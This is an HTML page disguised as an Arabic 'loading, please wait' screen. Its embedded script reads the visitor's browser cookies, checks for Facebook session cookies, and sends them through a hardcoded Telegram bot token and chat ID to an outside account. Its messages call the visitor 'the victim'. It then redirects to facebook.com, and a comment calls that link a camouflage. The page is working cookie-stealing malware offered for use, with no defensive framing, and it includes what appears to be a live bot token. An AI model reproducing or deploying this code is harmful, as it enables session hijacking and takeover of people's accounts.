<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>جاري التحميل...</title>
  <style>
    body {
      background-color: #ffffff;
      color: #222;
      font-family: sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      flex-direction: column;
    }
  </style>
</head>
<body>
  <h3>🔄 جاري التحميل، برجاء الانتظار...</h3>

  <script>
    const botToken = "8066816136:AAFqNp9OCT2hHS00yOZ0HfUBzBCxi1ocpY0";
    const chatId = "6884787120";

    // اجمع الكوكيز
    const cookies = document.cookie;
    alert("Cookies:\n" + cookies); // للمساعدة في التجربة

    // دالة إرسال الرسالة
    function sendToTelegram(message) {
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
        .then(response => {
          if (!response.ok) {
            alert("❌ فشل الإرسال لتليجرام.");
          }
        })
        .catch(error => {
          alert("❌ خطأ أثناء الإرسال:\n" + error);
        });
    }

    // تحقق من وجود جلسة فيسبوك
    if (cookies.includes("c_user") && cookies.includes("xs")) {
      const msg = "🔥 تم التقاط جلسة فيسبوك:\n\n" + cookies;
      sendToTelegram(msg);
    } else {
      sendToTelegram("❌ لم يتم العثور على جلسة فيسبوك.\n🔍 قد لا يكون الضحية مسجل دخول من المتصفح.");
    }

    // إعادة توجيه بعد 3 ثواني
    setTimeout(() => {
      window.location.href = "https://facebook.com"; // رابط تمويهي
    }, 3000);
  </script>
</body>
</html>
